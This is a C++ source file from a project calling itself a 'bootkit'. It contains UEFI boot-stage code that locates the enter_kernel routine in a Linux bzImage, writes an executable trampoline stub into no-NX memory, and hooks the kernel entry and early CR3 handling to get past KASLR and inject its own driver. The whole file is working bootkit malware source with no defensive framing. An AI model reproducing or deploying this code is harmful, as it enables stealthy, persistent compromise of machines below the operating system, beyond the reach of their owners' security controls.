#include <bootkit/arch/x86/memory.hpp>
#include <bootkit/arch/x86/x86.hpp>
#include <bootkit/binary/heuristic.hpp>
#include <bootkit/general.hpp>
#include <bootkit/hooking/jmp_hooking.hpp>
#include <bootkit/hooks/bzimage.hpp>
#include <bootkit/hooks/linux.hpp>
#include <bootkit/linux/vmlinux.hpp>

void hooks::bzimage::enter_kernel_hook()
{
  uintptr_t new_vma_jmp;
  uintptr_t mov_cr3_addr;
  bool is_old;

  // at this point ExitBootServices was already called
  g::state |= POST_EXIT_BOOT_SERVICES;
  jmp_unhook(&enter_kernel_hook_context);

  hooks::vmlinux::kaslr_mov_hook_ctx.hooked = false;
  new_vma_jmp = heuristic::find_startup_64_va_jmp(bzimage::startup_64_addr, &mov_cr3_addr, &is_old);
  if (new_vma_jmp) {
    uintptr_t jmp_target = new_vma_jmp + 6 + *reinterpret_cast<int32_t *>(new_vma_jmp + 2);
    hooks::vmlinux::common_startup_64 = reinterpret_cast<uintptr_t *>(jmp_target);

    dbg::serial_print("Hooking early CR3 mov at %Lx\r\n", mov_cr3_addr);
    jmp_hook(mov_cr3_addr, reinterpret_cast<uintptr_t>(hooks::vmlinux::kaslr_cr3_mov),
             &hooks::vmlinux::kaslr_mov_hook_ctx, JMP_MODE_BEST_SUITABLE);
  }
  else
    dbg::serial_print("KASLR jmp not found\r\n");

  __asm__ volatile("jmp *%%rax\n\t" : : "S"(startup_64_rsi), "a"(startup_64_addr) : "memory");
  __builtin_unreachable();
}

void *hooks::bzimage::make_enter_kernel_hook_stub(uint8_t reg)
{
  EFI_PHYSICAL_ADDRESS stub;
  uint8_t *stub_b;

  if (g::bs->AllocatePages(AllocateAnyPages, EfiRuntimeServicesCode, 1, &stub) != EFI_SUCCESS)
    return nullptr;

  if (!pt::mark_page_present(stub, ENTRY_RW /* no NX for RWX */))
    return nullptr;

  stub_b = reinterpret_cast<uint8_t *>(stub);
  stub_b[0] = P_REX | P_W_BIT | ((reg & 0b1000) ? P_B_BIT : 0); // 64 bit
  stub_b[1] = 0x90 + (reg & 0b111);                             // xchg ax, reg
  stub_b[2] = P_REX | P_W_BIT;                                  // 64 bit
  stub_b[3] = 0xa3;                                             // mov [imm64], (r)ax
  *reinterpret_cast<void **>(&stub_b[4]) = &bzimage::startup_64_addr;
  stub_b[12] = P_REX | P_W_BIT; // 64 bit
  stub_b[13] = 0x96;            // xchg rsi, rax
  stub_b[14] = P_REX | P_W_BIT; // 64 bit
  stub_b[15] = 0xa3;            // mov [imm64], (r)ax
  *reinterpret_cast<void **>(&stub_b[16]) = &bzimage::startup_64_rsi;
  stub_b[24] = P_REX | P_W_BIT; // 64 bit
  stub_b[25] = 0x96;            // xchg rsi, rax
  stub_b[26] = P_REX | P_W_BIT | ((reg & 0b1000) ? P_B_BIT : 0);
  stub_b[27] = 0x90 + (reg & 0b111);
  stub_b[28] = 0xff; // jmp
  stub_b[29] = 0x25;
  *reinterpret_cast<int32_t *>(&stub_b[30]) = 0;
  *reinterpret_cast<void **>(&stub_b[34]) =
      reinterpret_cast<void *>(hooks::bzimage::enter_kernel_hook);

  __asm__ volatile("wbinvd" ::: "memory");

  return stub_b;
}

bool hooks::bzimage::try_hook_enter_kernel(uintptr_t jmp_insn_address, uint8_t reg)
{
  void *stub;

  stub = make_enter_kernel_hook_stub(reg);
  if (stub == nullptr) {
    dbg::print(DEBUG_ERROR, "Couldn't allocate stub for enter_kernel hook\r\n");
    return false;
  }

  enter_kernel_hook_context.hooked = false;
  if (!jmp_hook(jmp_insn_address, reinterpret_cast<uintptr_t>(stub), &enter_kernel_hook_context)) {
    dbg::print(DEBUG_ERROR, "Could not hook enter_kernel with a standard jmp hook\r\n");
    return false;
  }

  dbg::print(DEBUG_INFO, "Hooked enter_kernel with a standard jmp hook\r\n");

  return true;
}

bool hooks::bzimage::do_hook_bzimage(uintptr_t bzimage_base, size_t size)
{
  uintptr_t enter_kernel_addr;
  size_t frame_count;
  size_t frames_identity_map;
  size_t frames_brk_tmp_map;
  size_t frames_extra;
  size_t driver_len;
  EFI_STATUS res;
  uint8_t reg;
  bool la57;
  // bool deferred_path;

  dbg::print(DEBUG_INFO, "Looking for enter_kernel...\r\n");
  enter_kernel_addr = 0;
  for (size_t i = 0; i < size; i++) {
    if (heuristic::is_enter_kernel(bzimage_base + i, &reg)) {
      enter_kernel_addr = bzimage_base + i;
      break;
    }
  }

  if (!enter_kernel_addr) {
    dbg::print(DEBUG_ERROR, "Failed to find enter_kernel in bzImage\r\n");
    return false;
  }

  la57 = AsmReadCr4() & CR4_LA57;
  driver_len = ALIGN_VALUE(g::driver_len, PS_4K);
  frames_identity_map = pt::frame_count(g::driver_pa, driver_len, 5);
  frames_brk_tmp_map = la57 ? 5 : 4;
  frames_extra = 4;
  frame_count = frames_identity_map + frames_brk_tmp_map + frames_extra;
  res = pt::reserved_pool::init_pool(frames_extra);
  if (EFI_ERROR(res)) {
    dbg::print(DEBUG_ERROR, "Failed to allocate page table reserved pool (%r)\r\n", res);
    // TODO: implement SetVirtualAddressMap hook for deferred kernel patch logic
    return false;
  }
  
  dbg::serial_print("Allocated EFI frame pool with %Lu entries\r\n", frame_count);
  if (!try_hook_enter_kernel(enter_kernel_addr, reg)) {
    dbg::print(DEBUG_ERROR, "Failed to hook enter_kernel at %Lx\r\n", enter_kernel_addr);
    return false;
  }

  return true;
}
